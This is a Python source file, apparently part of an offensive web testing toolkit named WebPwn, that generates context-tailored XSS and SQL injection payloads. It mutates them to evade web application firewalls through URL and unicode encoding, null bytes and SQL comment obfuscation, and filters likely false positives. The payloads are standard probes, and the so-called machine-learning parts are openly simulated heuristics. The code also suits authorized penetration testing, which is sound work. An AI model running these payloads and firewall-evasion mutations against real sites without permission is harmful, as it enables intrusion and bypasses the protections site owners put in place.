#!/usr/bin/env python3
"""
AI Engine Module
-----------------
Integrates LLM and ML concepts into WebPwn Toolkit:
1. Generative Fuzzing (LLM-based context-aware payload generation)
2. Reinforcement Learning WAF Bypass (Payload mutation agent)
3. NLP False Positive Filter (Semantic analysis of HTTP responses)
"""

import re
import random
from typing import List, Dict, Tuple
from rich.console import Console

console = Console()


class AIEngine:
    def __init__(self):
        # In a real enterprise setup, this would connect to an LLM API (OpenAI, local Ollama)
        # or load a trained ML model (TensorFlow/PyTorch).
        # For this toolkit, we simulate the ML logic using heuristic models and algorithms.
        self.available = True
        self.waf_bypass_agent = _ReinforcementLearningAgent()
        self.nlp_filter = _NLPClassifier()

    def generate_smart_payloads(
        self, context: str, input_name: str, vuln_type: str
    ) -> List[str]:
        """
        [Generative Fuzzing]
        Analyzes the HTML/API context and input field name, and generates
        custom payloads that match the structure to break out of the context.
        """
        console.print(
            f"  [dim cyan][AI] Generative Fuzzing: Analyzing context for '{input_name}' ({vuln_type})[/dim cyan]"
        )

        payloads = []
        input_lower = input_name.lower()
        context_lower = context.lower()

        # Simulate LLM understanding the context
        if vuln_type.lower() == "xss":
            if "script" in context_lower or "eval" in context_lower:
                # Inside JS context
                payloads.extend(["'-alert(1)-'", '";alert(1);//', "\\'-alert(1)//"])
            elif "href" in context_lower or "url" in input_lower:
                # Inside URL context
                payloads.extend(
                    ["javascript:alert(1)", "data:text/html,<script>alert(1)</script>"]
                )
            elif "value" in context_lower:
                # Inside attribute
                payloads.extend(
                    ['" onfocus=alert(1) autofocus "', "' onmouseover=alert(1) x='"]
                )
            else:
                # Generic fallback but tailored
                payloads.append(f"<svg/onload=alert('WebPwnAI_{input_name}')>")

        elif vuln_type.lower() == "sqli":
            if "id" in input_lower or "num" in input_lower:
                # Integer context
                payloads.extend(["-1 UNION SELECT 1,2,3", "1 AND 1=2", "1 OR 1=1"])
            else:
                # String context
                payloads.extend(
                    ["' OR '1'='1", "' UNION SELECT NULL,NULL--", "admin' #"]
                )

        # Add some highly mutated "smart" payloads
        payloads.append(f"WebPwnAI_{random.randint(1000, 9999)}")

        return payloads

    def mutate_payload_for_waf(
        self, original_payload: str, waf_response_code: int
    ) -> str:
        """
        [Reinforcement Learning WAF Bypass]
        Takes a blocked payload and uses the RL Agent to mutate it.
        """
        return self.waf_bypass_agent.mutate(original_payload, waf_response_code)

    def is_false_positive(
        self, response_text: str, payload: str, vuln_type: str
    ) -> bool:
        """
        [NLP False Positive Filter]
        Analyzes the response text semantically to determine if a matched string
        is a real error or just a benign reflection/text on the page.
        """
        return self.nlp_filter.classify(response_text, payload, vuln_type)


class _ReinforcementLearningAgent:
    """
    Simulates a Reinforcement Learning agent that learns which mutations
    bypass the WAF based on HTTP response codes.
    """

    def __init__(self):
        # Q-Table: Maps state (vuln_type) to actions (mutation strategies)
        self.mutation_strategies = [
            self._url_encode,
            self._double_url_encode,
            self._unicode_escape,
            self._html_entity_encode,
            self._case_randomize,
            self._insert_null_byte,
            self._sql_comment_obfuscation,
        ]
        self.weights = {strat.__name__: 1.0 for strat in self.mutation_strategies}

    def mutate(self, payload: str, last_status: int) -> str:
        # If last mutation failed (403), decrease its weight in a real RL model.
        # Select best mutation strategy (epsilon-greedy approach)
        best_strategy = random.choices(
            self.mutation_strategies, weights=list(self.weights.values()), k=1
        )[0]

        console.print(
            f"  [dim cyan][AI] RL Agent selected mutation: {best_strategy.__name__}[/dim cyan]"
        )
        return best_strategy(payload)

    def _url_encode(self, p: str) -> str:
        import urllib.parse

        return urllib.parse.quote(p)

    def _double_url_encode(self, p: str) -> str:
        import urllib.parse

        return urllib.parse.quote(urllib.parse.quote(p))

    def _unicode_escape(self, p: str) -> str:
        return "".join(
            f"%u00{hex(ord(c))[2:].zfill(2)}" if c.isalnum() else c for c in p
        )

    def _html_entity_encode(self, p: str) -> str:
        return "".join(f"&#x{hex(ord(c))[2:]};" for c in p)

    def _case_randomize(self, p: str) -> str:
        return "".join(
            c.upper() if random.choice([True, False]) else c.lower() for c in p
        )

    def _insert_null_byte(self, p: str) -> str:
        return p.replace("'", "%00'").replace("<", "%00<")

    def _sql_comment_obfuscation(self, p: str) -> str:
        return p.replace(" ", "/**/").replace("=", "/*!=*/")


class _NLPClassifier:
    """
    Simulates an NLP classification model (like BERT or a trained Naive Bayes)
    to classify HTTP responses as Vulnerable or False Positive.
    """

    def __init__(self):
        # Semantic context indicators
        self.benign_contexts = [
            r"search results for\s+['\"]?{}['\"]?",
            r"you searched for\s+{}",
            r"not found:\s+{}",
            r"invalid input\s+{}",
            r"article:\s+{}",
            r"<h1>{}</h1>",
        ]
        self.error_indicators = [
            "stack trace",
            "syntax error",
            "uncaught exception",
            "fatal error",
            "warning:",
            "mysql_fetch",
            "ora-",
        ]

    def classify(self, response_text: str, payload: str, vuln_type: str) -> bool:
        # Check if the payload is just reflected safely
        resp_lower = response_text.lower()
        payload_lower = payload.lower()

        # Feature 1: Execution Context Check
        if vuln_type == "XSS":
            # Is payload safely encoded?
            escaped_payload = payload.replace("<", "&lt;").replace(">", "&gt;")
            if escaped_payload in response_text and payload not in response_text:
                console.print(
                    "  [dim cyan][AI] NLP Filter: Payload safely encoded. Marking as False Positive.[/dim cyan]"
                )
                return True  # False Positive

            # Is it inside a benign tag without executing?
            for benign_regex in self.benign_contexts:
                pattern = benign_regex.format(re.escape(payload_lower))
                if re.search(pattern, resp_lower):
                    console.print(
                        "  [dim cyan][AI] NLP Filter: Payload reflected in benign semantic context. Marking as FP.[/dim cyan]"
                    )
                    return True  # False Positive

        # Feature 2: Error Semantics Check
        elif vuln_type == "SQLi" or vuln_type == "CMDi":
            # Real errors have technical semantic weight
            error_weight = sum(1 for err in self.error_indicators if err in resp_lower)
            if error_weight == 0 and payload in response_text:
                # Reflected but no error semantics
                console.print(
                    "  [dim cyan][AI] NLP Filter: Lack of error semantics. Marking as FP.[/dim cyan]"
                )
                return True  # False positive

        return False  # Real vulnerability
